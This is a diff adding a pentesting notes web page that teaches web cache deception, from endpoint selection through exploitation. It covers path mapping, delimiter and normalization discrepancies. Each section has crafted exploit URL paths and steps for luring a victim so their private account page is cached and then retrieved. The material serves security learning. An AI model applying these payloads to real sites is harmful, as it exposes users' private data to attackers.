@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | Web cache deception</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Web cache deception</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#constructing-a-web-cache-deception-attack" id="toc-constructing-a-web-cache-deception-attack">Constructing a web cache deception attack</a></li>
+<li><a href="#static-extension-cache-rules" id="toc-static-extension-cache-rules">Static extension cache rules</a>
+<ul>
+<li><a href="#path-mapping-discrepancies" id="toc-path-mapping-discrepancies">Path mapping discrepancies</a></li>
+<li><a href="#delimiter-discrepancies" id="toc-delimiter-discrepancies">Delimiter discrepancies</a></li>
+</ul></li>
+<li><a href="#static-directory-cache-rules-with-normalization-discrepancies" id="toc-static-directory-cache-rules-with-normalization-discrepancies">Static directory cache rules (with normalization discrepancies)</a>
+<ul>
+<li><a href="#normalization-by-the-origin-server" id="toc-normalization-by-the-origin-server">Normalization by the origin server</a></li>
+<li><a href="#normalization-by-the-cache-server" id="toc-normalization-by-the-cache-server">Normalization by the cache server</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<details>
+<summary>
+Introduction
+</summary>
+<p>Web cache deception is a vulnerability where an attacker tricks a web cache into storing sensitive content due to differences in how cache and origin servers handle requests. The attacker lures a victim into visiting a malicious URL, causing the cache to mistakenly store private data as a static resource. The attacker can then access the cached response, gaining unauthorized access to the sensitive information.</p>
+</details>
+<p>More info about web cache: <a href="/Web/Web%20security/web%20cache.html">Web cache</a></p>
+<hr />
+<h2 id="constructing-a-web-cache-deception-attack">Constructing a web cache deception attack</h2>
+<ol type="1">
+<li>Identify a target endpoint that returns dynamic responses with sensitive information, focusing on those supporting <code>GET</code>, <code>HEAD</code>, or <code>OPTIONS</code> methods, as they are typically cached</li>
+<li>Look for discrepancies in how the cache and origin server parse the URL path</li>
+<li>Craft a malicious URL to trick the cache into storing a dynamic response. When the victim accesses it, their data is cached. Use Burp to request the same URL and retrieve the cached response. Avoid using a browser to prevent redirects or data invalidation.</li>
+</ol>
+<hr />
+<h2 id="static-extension-cache-rules">Static extension cache rules</h2>
+<p>Cache rules often target static resources by matching common file extensions like <code>.css</code> or <code>.js</code>. This is the default behavior in most CDNs.</p>
+<h3 id="path-mapping-discrepancies">Path mapping discrepancies</h3>
+<details>
+<summary>
+Path mapping discrepancies (REST-style vs traditional URL)
+</summary>
+<p>Consider the following example:</p>
+<p><code>http://example.com/user/123/profile/wcd.css</code></p>
+<ul>
+<li>An origin server using <strong>REST-style</strong> URL mapping may interpret this as a request for the <code>/user/123/profile</code> endpoint and returns the profile information for user <code>123</code>, ignoring <code>wcd.css</code> as a non-significant parameter.</li>
+<li>A cache that uses <strong>traditional URL</strong> mapping may view this as a request for a file named <code>wcd.css</code> located in the <code>/profile</code> directory under <code>/user/123</code>. It interprets the URL path as <code>/user/123/profile/wcd.css</code>. If the cache is configured to store responses for requests where the path ends in <code>.css</code>, it would cache and serve the profile information as if it were a CSS file.</li>
+</ul>
+</details>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Find good endpoint</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account        <span class="co"># Contains sensitive data -&gt; Good endpoint</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Check if web cache is used</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>test.js <span class="co"># 1 time &quot;X-Cache: miss&quot; -&gt; Ok, there should be a cache mechanism</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>test.js <span class="co"># 2 time &quot;X-Cache: hit&quot; -&gt; Perfect, the page is cached</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Check if origin server uses REST-style</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account<span class="op">/</span>abc    <span class="co"># The response is identical to the original -&gt; REST-style</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Check if cache server uses traditional URL &amp; explotation</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account<span class="op">/</span>abc.js <span class="co"># 1 time &quot;X-Cache: miss&quot; -&gt; Ok, there should be a cache mechanism</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account<span class="op">/</span>abc.js <span class="co"># 2 time &quot;X-Cache: hit&quot; -&gt; Perfect, the page is cached</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Now https://site.com/my-account/abc.js contains your sensitive data cached</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="co"># Find a way to send the victim on http://site.com/my-account/xyz.js</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Note: I omitted cache buster for simplicity</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>:</p>
+<ul>
+<li>This attack is limited to the specific endpoint that you tested, as the origin server often has different abstraction rules for different endpoints.</li>
+<li>Try various extensions, such as <code>.css</code>, <code>.ico</code>, and <code>.exe</code>, as caches may have rules for specific extensions.</li>
+</ul>
+</blockquote>
+<h3 id="delimiter-discrepancies">Delimiter discrepancies</h3>
+<p>Objective: identify a character that is used as a delimiter by the origin server but not the cache. Use this list: <a href="https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list">https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list</a></p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Find good endpoint</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account        <span class="co"># Contains sensitive data -&gt; Good endpoint</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Check if web cache is used</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>test.js <span class="co"># 1 time &quot;X-Cache: miss&quot; -&gt; Ok, there should be a cache mechanism</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>test.js <span class="co"># 2 time &quot;X-Cache: hit&quot; -&gt; Perfect, the page is cached</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Fuzz delimeter char</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account§§aaa   <span class="co"># Fuzz delimeter char. -&gt; with &quot;;&quot; -&gt; The response matches the original</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Check if delimiter is not used by the cache</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account         <span class="co"># &quot;X-Cache: miss&quot;</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account<span class="op">;</span>abc.js  <span class="co"># &quot;X-Cache: miss&quot;</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a><span class="co"># So the cache thinks &quot;/my-account&quot; is different from &quot;/my-account;abc.js&quot;</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Exploitation</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account<span class="op">;</span>abc.js <span class="co"># 1 time &quot;X-Cache: miss&quot;</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account<span class="op">;</span>abc.js <span class="co"># 2 time &quot;X-Cache: hit&quot;</span></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a><span class="co"># Now https://site.com/my-account;abc.js contains your sensitive data cached</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="co"># Find a way to send the victim on http://site.com/my-account;xyz.js</span></span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a><span class="co"># Note: I omitted cache buster for for simplicity</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>:</p>
+<ul>
+<li>Because delimiters are generally used consistently within each server, you can often use this attack on many different endpoints.</li>
+<li>Some delimiter characters may be processed by the victim’s browser before it forwards the request to the cache. This means that some delimiters can’t be used in an exploit. For example, browsers URL-encode characters like <code>{</code>, <code>}</code>, <code>&lt;</code>, and <code>&gt;</code>, and use <code>#</code> to truncate the path.</li>
+</ul>
+<p>If the cache or origin server decodes these characters, it may be possible to use an encoded version in an exploit.</p>
+<ul>
+<li>Make sure to test all ASCII characters and a range of common extensions, including <code>.css</code>, <code>.ico</code>, and <code>.exe</code></li>
+</ul>
+</blockquote>
+<hr />
+<h2 id="static-directory-cache-rules-with-normalization-discrepancies">Static directory cache rules (with normalization discrepancies)</h2>
+<p>Web servers often store static resources in specific directories. Cache rules typically target these by matching URL path prefixes like <code>/static</code>, <code>/assets</code>, <code>/scripts</code>, or <code>/images</code>.</p>
+<p>Premise</p>
+<ul>
+<li>If you type in your browser <code>https://website/test/../account</code>, it’ll make the following request <code>GET /account HTTP/2</code>.</li>
+<li>If you type in your browser<code>https://website/test/..%2faccount</code>, it’ll make the following request <code>GET /test/..%2faccount HTTP/2</code>.</li>
+</ul>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Find good endpoint</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account            <span class="co"># Contains sensitive data -&gt; Good endpoint</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Check if web cache is used (with static resources)</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>js<span class="op">/</span>info.js     <span class="co"># 1 time &quot;X-Cache: miss&quot; -&gt; Ok, there should be a cache mechanism</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>js<span class="op">/</span>info.js     <span class="co"># 2 time &quot;X-Cache: hit&quot; -&gt; Perfect, the page is cached</span></span></code></pre></div>
+<h3 id="normalization-by-the-origin-server">Normalization by the origin server</h3>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Confirm that the cache rule is based on the static directory</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>..<span class="op">/</span>xxx         <span class="co"># 1 time &quot;X-Cache: miss&quot;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>..<span class="op">/</span>xxx         <span class="co"># 2 time &quot;X-Cache: hit&quot; -&gt; so all subpages in /static/ will be cached </span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Detecting normalization by the origin server</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>aaa<span class="op">/</span>..<span class="op">%</span><span class="dv">2</span><span class="er">fmy</span><span class="op">-</span>account   <span class="co"># Returns the profile information -&gt; The origin server decodes the slash and resolves the dot-segment</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Detecting normalization by the cache server</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>js<span class="op">/</span>info.js     <span class="co"># 1 time &quot;X-Cache: miss&quot;</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>js<span class="op">%</span><span class="dv">2</span><span class="er">finfo</span>.js   <span class="co"># 2 time &quot;X-Cache: miss&quot; -&gt; Cache isn&#39;t normalizing the path before mapping it to the endpoint</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="co"># So the cache thinks &quot;/static/js/info.js&quot; is different from &quot;/static/js%2finfo.js&quot;</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Exploiting</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>..<span class="op">%</span><span class="dv">2</span><span class="er">fmy</span><span class="op">-</span>account</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="co"># The cache interprets the path as: /static/..%2fmy-account</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="co"># The origin server interprets the path as: /my-account</span></span></code></pre></div>
+<h3 id="normalization-by-the-cache-server">Normalization by the cache server</h3>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Confirm that the cache rule is based on the static directory</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="co"># This step is useless, so you can&#39;t confirm if the cache decodes </span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="co"># dot-segments and URL paths without trying an exploit.</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Detecting normalization by the origin server</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>aaa<span class="op">/</span>..<span class="op">%</span><span class="dv">2</span><span class="er">fmy</span><span class="op">-</span>account   <span class="co"># Not found -&gt; The origin server doesn&#39;t decode the slash and doesn&#39;t resolve the dot-segment</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Detecting normalization by the cache server</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>js<span class="op">/</span>info.js     <span class="co"># 1 time &quot;X-Cache: miss&quot;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>js<span class="op">/</span>info.js     <span class="co"># 2 time &quot;X-Cache: hit&quot;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>js<span class="op">%</span><span class="dv">2</span><span class="er">finfo</span>.js   <span class="co"># 2 time &quot;X-Cache: hit&quot; -&gt; Cache has normalized the path</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="co"># So the cache understand that they are the same path</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Identify a delimiter that is used by the origin server but not the cache</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account§§aaa   <span class="co"># Fuzz delimeter char. -&gt; with &quot;%23&quot; -&gt; The response matches the original</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Check if delimiter is not used by the cache </span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>js<span class="op">/</span>info.js        <span class="co"># &quot;X-Cache: miss&quot;</span></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>static<span class="op">/</span>js<span class="op">/</span>info.js<span class="op">%</span><span class="dv">23</span><span class="er">aaa</span>  <span class="co"># &quot;X-Cache: miss&quot;</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="co"># So the cache thinks &quot;info.js&quot; is different from &quot;info.js%23aaa&quot;</span></span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Exploitation</span></span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a><span class="op">/</span>my<span class="op">-</span>account<span class="op">%</span><span class="dv">23</span><span class="op">%</span><span class="dv">2</span><span class="er">f</span><span class="op">%</span><span class="dv">2</span><span class="er">e</span><span class="op">%</span><span class="dv">2</span><span class="er">e</span><span class="op">%</span><span class="dv">2</span><span class="er">fstatic</span><span class="op">/</span>js<span class="op">/</span>info.js</span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a><span class="co"># The cache interprets the path as: /static</span></span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a><span class="co"># The origin server interprets the path as: /my-account</span></span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
